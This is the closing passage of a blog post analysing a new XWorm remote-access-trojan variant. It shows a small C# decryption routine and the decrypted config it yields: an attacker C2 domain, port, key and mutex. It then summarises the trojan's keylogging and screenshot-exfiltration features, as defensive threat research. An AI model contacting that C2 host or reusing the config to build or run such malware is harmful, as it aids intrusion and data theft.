style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Main2</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">void</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Main</span><span style="color: #F8F8F2">()</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        Settings.Host </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.Host);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted Host: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.Host);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.Port </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.Port);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted Port: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.Port);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.KEY </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.KEY);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted KEY: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.KEY);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.SPL </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.SPL);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted SPL: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.SPL);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.USBNM </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.USBNM);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted USBNM: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.USBNM);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-sv5aos">Finally, we can reveal the malware family used by threat actors:</p> <!-- HTML_TAG_START --><pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" txt="true" title="decrypted strings"><div class='code-title'>decrypted strings</div><div class="language-id">txt</div><div class='code-container'><code><div class='line dim'><span style="color: undefined">Decrypted Host: xwv5group7001.duckdns.org</span></div><div class='line dim'><span style="color: undefined">Decrypted Port: 7001</span></div><div class='line dim'><span style="color: undefined">Decrypted KEY: &lt;123456789&gt;</span></div><div class='line highlight'><span style="color: undefined">Decrypted SPL: &lt;Xwormmm&gt;</span></div><div class='line dim'><span style="color: undefined">Decrypted USBNM: USB.exe</span></div></code></div></pre><!-- HTML_TAG_END --> <p data-svelte-h="svelte-3hipc8">Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href="https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="conclusion" data-svelte-h="svelte-kmpttn"><a href="#conclusion">Conclusion</a></h2> <p data-svelte-h="svelte-20trsz">The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?</p> <p data-svelte-h="svelte-tpm7dn">Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!</p></main> <div class="divider mt-4 mb-0"></div> <div><a href="/?tags=Malware Analysis" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#Malware Analysis </a><a href="/?tags=XWorm" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#XWorm </a></div></div>  </article> <footer class="footer footer-center bg-base-300 text-base-content shadow-inner p-8 md:rounded-box sticky bottom-0 z-0 md:static " id="footer"><div class="prose"><p><a href="/blog/atom.xml" rel="noopener noreferrer external" target="_blank">Feed</a> <span class="mr-1" data-svelte-h="svelte-lk4btp">·</span><a href="/blog/sitemap.xml" rel="noopener noreferrer external" target="_blank">Sitemap</a>  <br>
      Copyright © 2025 Kryptoenix <br>
      Powered by
      <a class="tooltip tooltip-secondary hover:text-secondary" data-tip="🌸 [Polaris] - Based on MDsveX &amp; SvelteKit 🌸" href="https://github.com/importantimport/urara" rel="noopener noreferrer external" target="_blank" data-svelte-h="svelte-vjman6">Urara</a> </p></div></footer></div></div></div> 
			<script type="application/json" data-sveltekit-fetched data-url="/blog/posts.json">{"status":200,"statusText":"","headers":{},"body":"[{\"title\":\"About\",\"flags\":[\"unlisted\"],\"created\":\"2025-08-28T16:53:50.479Z\",\"updated\":\"2025-08-28T16:53:50.479Z\",\"images\":[],\"tags\":[],\"slug\":\"/about/+page.svelte.md\",\"path\":\"/blog/about\",\"toc\":[{\"depth\":2,\"slug\":\"hello-world\",\"title\":\"Hello World\"}],\"html\":\"\",\"type\":\"article\"},{\"title\":\"Demystifying CVE-2025-47987\",\"image\":\"/demystifying-CVE-2025-47987/image-cve1.png\",\"created\":\"2025-07-10T00:00:00.000Z\",\"updated\":\"2025-07-10T00:00:00.000Z\",\"tags\":[\"CVE-2025-47987\",\"Reverse Engineering\",\"Windows\"],\"images\":[],\"slug\":\"/demystifying-CVE-2025-47987/+page.svelte.md\",\"path\":\"/blog/demystifying-CVE-2025-47987\",\"toc\":[{\"depth\":2,\"slug\":\"client-authentication-architecture\",\"title\":\"Client Authentication Architecture\"},{\"depth\":2,\"slug\":\"root-cause\",\"title\":\"Root Cause\"},{\"depth\":2,\"slug\":\"building-a-poc-crash\",\"title\":\"Building a PoC Crash\"},{\"depth\":3,\"slug\":\"reaching-tsinitcertcreds\",\"title\":\"Reaching TSInitCertCreds()\"},{\"depth\":4,\"slug\":\"crafting-a-valid-packed-kerbcertlogonbuffer\",\"title\":\"Crafting a valid packed KerbCertLogonBuffer\"},{\"depth\":3,\"slug\":\"reaching-the-vulnerable-function\",\"title\":\"Reaching the vulnerable function\"},{\"depth\":4,\"slug\":\"crafting-a-valid-csp-buffer\",\"title\":\"Crafting a valid CSP buffer\"},{\"depth\":3,\"slug\":\"triggering-the-bug\",\"title\":\"Triggering the bug\"},{\"depth\":2,\"slug\":\"exploitation-ideas\",\"title\":\"Exploitation Ideas\"},{\"depth\":2,\"slug\":\"conclusion\",\"title\":\"Conclusion\"},{\"depth\":2,\"slug\":\"references\",\"title\":\"References\"}],\"html\":\"\",\"type\":\"article\"},{\"title\":\"Hunting in the wild - XWorm new variant\",\"image\":\"/xworm-malware-analysis/xworm-p.png\",\"alt\":\"Urara\",\"created\":\"2024-02-17T00:00:00.000Z\",\"updated\":\"2024-02-17T00:00:00.000Z\",\"tags\":[\"Malware Analysis\",\"XWorm\"],\"images\":[],\"slug\":\"/xworm-malware-analysis/+page.svelte.md\",\"path\":\"/blog/xworm-malware-analysis\",\"toc\":[{\"depth\":2,\"slug\":\"introduction\",\"title\":\"Introduction\"},{\"depth\":2,\"slug\":\"first-sign-of-malicious-code\",\"title\":\"First sign of malicious code\"},{\"depth\":2,\"slug\":\"new-language-old-friend\",\"title\":\"New language, old friend\"},{\"depth\":2,\"slug\":\"decompiling-the-culprit\",\"title\":\"Decompiling the culprit\"},{\"depth\":2,\"slug\":\"searching-for-keys\",\"title\":\"Searching for keys?\"},{\"depth\":2,\"slug\":\"conclusion\",\"title\":\"Conclusion\"}],\"html\":\"\",\"type\":\"article\"}]"}</script>
			<script>
				{
					__sveltekit_105gmka = {
						base: new URL("..", location).pathname.slice(0, -1),
						assets: "/blog"
					};

					const element = document.currentScript.parentElement;

					Promise.all([
						import("../_app/immutable/entry/start.gcyZunpf.js"),
						import("../_app/immutable/entry/app.BGxrQcjP.js")
					]).then(([kit, app]) => {
						kit.start(app, element, {
							node_ids: [0, 5],
							data: [null,null],
							form: null,
							error: null
						});
					});
				}
			</script>
		</div>
  </body>
</html>
